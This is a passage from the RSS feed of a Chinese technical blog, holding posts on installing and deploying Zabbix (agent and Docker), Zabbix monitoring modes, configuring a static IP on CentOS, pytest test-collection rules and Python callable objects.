&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;rpm -Uvh https://repo.zabbix.com/zabbix/5.4/rhel/7/x86_64/zabbix-release-5.4-1.el7.noarch.rpm
yum clean all
yum install zabbix-agent
systemctl restart zabbix-agent
systemctl enable zabbix-agent
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2检查&#34;&gt;2.检查&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 服务监听&lt;/span&gt;
netstat -lntup|grep &lt;span style=&#34;color:#ae81ff&#34;&gt;10050&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 配置文件&lt;/span&gt;
vim /etc/zabbix/zabbix_agentd.conf
grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;^[a-Z]&amp;#34;&lt;/span&gt; /etc/zabbix/zabbix_agentd.conf
&lt;span style=&#34;color:#75715e&#34;&gt;# 日志&lt;/span&gt;
tail -f /var/log/zabbix/zabbix_agentd.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3部署环境-windows&#34;&gt;3.部署（环境 Windows）&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 安装&lt;/span&gt;
zabbix_agentd.exe -c zabbix_agentd.win.conf -i
&lt;span style=&#34;color:#75715e&#34;&gt;# 启动&lt;/span&gt;
zabbix_agentd.exe -s
&lt;span style=&#34;color:#75715e&#34;&gt;# 卸载&lt;/span&gt;
zabbix_agentd.exe -d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Zabbix—Docker 部署</title>
        <link>https://ac-lm.github.io/posts/zabbix/zabbixdocker-%E9%83%A8%E7%BD%B2/</link>
        <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/zabbix/zabbixdocker-%E9%83%A8%E7%BD%B2/</guid>
        <description>&lt;h2 id=&#34;1zabbix-server-docker-部署脚本&#34;&gt;1.Zabbix server Docker 部署脚本&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;docker network create --subnet 172.20.0.0/16 --ip-range 172.20.240.0/20 zabbix-net

docker run --name zabbix-mysql -t &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_DATABASE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_USER&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_ROOT_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --network&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;zabbix-net &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --restart unless-stopped &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -d mysql:8.0 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --character-set-server&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;utf8 --collation-server&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;utf8_bin &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --default-authentication-plugin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;mysql_native_password

docker run --name zabbix-gateway -t &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --network&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;zabbix-net &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --restart unless-stopped &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -d zabbix/zabbix-java-gateway:alpine-5.4-latest

docker run --name zabbix-server -t &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e DB_SERVER_HOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix-mysql&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_DATABASE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_USER&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_ROOT_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e ZBX_JAVAGATEWAY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix-gateway&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --network&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;zabbix-net &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -p 10000:10051 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --restart unless-stopped &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -d zabbix/zabbix-server-mysql:alpine-5.4-latest

docker run --name zabbix-web -t &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e ZBX_SERVER_HOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix-server&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e DB_SERVER_HOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix-mysql&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_DATABASE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_USER&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;zabbix&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -e MYSQL_ROOT_PASSWORD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --network&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;zabbix-net &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -p 8000:8080 &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      --restart unless-stopped &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;      -d zabbix/zabbix-web-nginx-mysql:alpine-5.4-latest

docker inspect -f&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{{.Name}} {{.NetworkSettings.IPAddress}} {{.HostConfig.PortBindings}}&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;docker ps -aq&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Zabbix—监控模式</title>
        <link>https://ac-lm.github.io/posts/zabbix/zabbix%E7%9B%91%E6%8E%A7%E6%A8%A1%E5%BC%8F/</link>
        <pubDate>Thu, 20 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/zabbix/zabbix%E7%9B%91%E6%8E%A7%E6%A8%A1%E5%BC%8F/</guid>
        <description>&lt;h2 id=&#34;1zabbix-的主动监控和被动监控&#34;&gt;1.Zabbix 的主动监控和被动监控&lt;/h2&gt;
&lt;h3 id=&#34;a被动监控默认&#34;&gt;a.被动监控（默认）&lt;/h3&gt;
&lt;p&gt;Zabbix Server 向 Agent 发起连接，发送监控 Key，由 Agent 接受请求，响应监控数据。这种模式被称为被动监控，其特点是由服务器轮询监控主机，获取数据。&lt;/p&gt;
&lt;h3 id=&#34;b主动监控&#34;&gt;b.主动监控&lt;/h3&gt;
&lt;p&gt;Agent 向 Zabbix Server 发起连接，Agent 请求需要检测的监控项目列表，Zabbix Server 响应并向 Agent 发送一个 items 列表，Agent 在收到监控列表后开始周期性地收集数据，并发送给 Zabbix Server，这样 Zabbix Server 不用每次需要数据都连接 Agent，Agent 会自己收集并处理数据，Zabbix Server 仅需要保存数据即可。这种模式被称为主动监控，其特点是由监控主机自己收集统计并发送给服务器，服务器不做询问操作。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux—固定 IP</title>
        <link>https://ac-lm.github.io/posts/linux/linux%E5%9B%BA%E5%AE%9A-ip/</link>
        <pubDate>Sun, 16 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linux%E5%9B%BA%E5%AE%9A-ip/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/54512739&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Linux - 配置固定的ip地址 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1修改配置文件&#34;&gt;1.修改配置文件&lt;/h2&gt;
&lt;p&gt;在文件夹&lt;code&gt;/etc/sysconfig/network-scripts/&lt;/code&gt;中，有着 Linux 系统的网络配置文件，其中&lt;code&gt;ifcfg-lo&lt;/code&gt;是回环网卡，&lt;code&gt;ifcfg-ens33&lt;/code&gt;就是&lt;code&gt;eth0&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;编辑&lt;code&gt;eth0&lt;/code&gt;网卡的配置文件&lt;code&gt;vim ifcfg-ens33&lt;/code&gt;如下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;TYPE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Ethernet&amp;#34;&lt;/span&gt;
PROXY_METHOD&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;none&amp;#34;&lt;/span&gt;
BROWSER_ONLY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 是否启动 DHCP：none 为禁用 DHCP；static 为使用静态 ip 地址&lt;/span&gt;
BOOTPROTO&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;static&amp;#34;&lt;/span&gt;
DEFROUTE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;
IPV4_FAILURE_FATAL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt;
IPV6INIT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;
IPV6_AUTOCONF&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;
IPV6_DEFROUTE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;
IPV6_FAILURE_FATAL&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no&amp;#34;&lt;/span&gt;
IPV6_ADDR_GEN_MODE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stable-privacy&amp;#34;&lt;/span&gt;
NAME&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ens33&amp;#34;&lt;/span&gt;
UUID&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b4701c26-8ea8-46a5-b738-1d4d0ca5b5a9&amp;#34;&lt;/span&gt;
DEVICE&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ens33&amp;#34;&lt;/span&gt;  
&lt;span style=&#34;color:#75715e&#34;&gt;# 启动或者重启网络时是否启动该设备：yes是启用；no是禁用&lt;/span&gt;
ONBOOT&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yes&amp;#34;&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 添加如下配置信息&lt;/span&gt;
DNS1&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.0.1          &lt;span style=&#34;color:#75715e&#34;&gt;# DNS&lt;/span&gt;
IPADDR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.1.122      &lt;span style=&#34;color:#75715e&#34;&gt;# IP地址&lt;/span&gt;
GATEWAY&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;192.168.1.1       &lt;span style=&#34;color:#75715e&#34;&gt;# 网关&lt;/span&gt;
PREFIX&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;                 &lt;span style=&#34;color:#75715e&#34;&gt;# centos子网掩码长度：24--&amp;gt; 255.255.255.0    &lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# 子网掩码 RedHat，不同版本的Linux的配置是不一样的 &lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# NETMASK=255.255.255.0 &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;重启网络服务&lt;code&gt;service network restart&lt;/code&gt;，IP 固定成功&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Pytest—用例收集规则</title>
        <link>https://ac-lm.github.io/posts/pytest&#43;allure/pytest%E7%94%A8%E4%BE%8B%E6%94%B6%E9%9B%86%E8%A7%84%E5%88%99/</link>
        <pubDate>Fri, 07 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/pytest&#43;allure/pytest%E7%94%A8%E4%BE%8B%E6%94%B6%E9%9B%86%E8%A7%84%E5%88%99/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/jaxon-chen/p/13204625.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 用例收集规则 @jaxon-chen &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1默认执行顺序&#34;&gt;1.默认执行顺序&lt;/h2&gt;
&lt;p&gt;pytest 默认执行顺序是按照 case 在代码中的顺序位置先后执行的。case 的收集默认从当前运行目录开始查找文件，该查找为递归查找，子目录中的文件也会被查找。pytest 能且仅能查找符合命名规则的 py 文件，默认规则是以&lt;code&gt;test _&lt;/code&gt;开头或者以&lt;code&gt;test&lt;/code&gt;结尾的 py 文件。&lt;/p&gt;
&lt;h2 id=&#34;2指定查找&#34;&gt;2.指定查找&lt;/h2&gt;
&lt;p&gt;使用同目录下的&lt;code&gt;pytest.ini&lt;/code&gt;或&lt;code&gt;conftest.py&lt;/code&gt;来改变搜索顺序。当在配置文件中指定目录后，pytest 就会从该目录中开始查找测试用例文件。&lt;code&gt;testpaths = ./scripts&lt;/code&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—callable</title>
        <link>https://ac-lm.github.io/posts/python/pythoncallable/</link>
        <pubDate>Thu, 25 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythoncallable/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/191419441&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; python 中的 callable 概念 @知乎&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是-callable&#34;&gt;1.什么是 callable&lt;/h2&gt;
&lt;p&gt;一个可 callable 的对象是指可以被调用执行的对象，并且可以传入参数。用另一个简单的描述方式是，只要可以在一个对象的后面使用小括号来执行代码，那么这个对象就是 callable 对象，下面列举 callable 对象的种类&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;函数&lt;/li&gt;
&lt;li&gt;类&lt;/li&gt;
&lt;li&gt;类里的函数&lt;/li&gt;
&lt;li&gt;实现了 &lt;code&gt;__call__&lt;/code&gt; 方法的实例对象&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;a函数&#34;&gt;a.函数&lt;/h3&gt;
&lt;p&gt;函数是 python 里的一等公民，函数是可调用对象，使用 callable 函数可以证明这一点&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;():
    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ok&amp;#39;&lt;/span&gt;)

print(callable(test))   &lt;span style=&#34;color:#75715e&#34;&gt;# True&lt;/span&gt;
test()  &lt;span style=&#34;color:#75715e&#34;&gt;# ok&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b类&#34;&gt;b.类&lt;/h3&gt;
&lt;p&gt;在其他编程语言里，类与函数可以说是两个完全不搭的东西，但在 python 里，都是可调用对象&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Stu&lt;/span&gt;(object):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, name):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; name


print(callable(Stu))     &lt;span style=&#34;color:#75715e&#34;&gt;# True&lt;/span&gt;
print(Stu(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;小明&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name)   &lt;span style=&#34;color:#75715e&#34;&gt;# 小明&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c类里的方法&#34;&gt;c.类里的方法&lt;/h3&gt;
&lt;p&gt;类里的方法也是用 def 定义的，本质上也是函数。使用 isfunction 函数可以判断一个对象是否是函数，run 方法也是可调用对象&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; inspect &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; isfunction, ismethod


&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Stu&lt;/span&gt;(object):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, name):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; name

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{name}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; is running&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name))

print(isfunction(Stu&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run))     &lt;span style=&#34;color:#75715e&#34;&gt;# True&lt;/span&gt;
stu &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Stu(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;小明&amp;#34;&lt;/span&gt;)
stu&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()        &lt;span style=&#34;color:#75715e&#34;&gt;# 小明 is running&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d实现了__call__方法的实例对象&#34;&gt;d.实现了&lt;code&gt;__call__&lt;/code&gt;方法的实例对象&lt;/h3&gt;
&lt;p&gt;当你执行 stu() 时，与调用一个函数有着完全一致的体验，如果不告诉你 stu 是一个类的实例对象，你还以为 stu 就是一个函数。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Stu&lt;/span&gt;(object):

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, name):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; name

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __call__(self, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;args, &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;kwargs):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
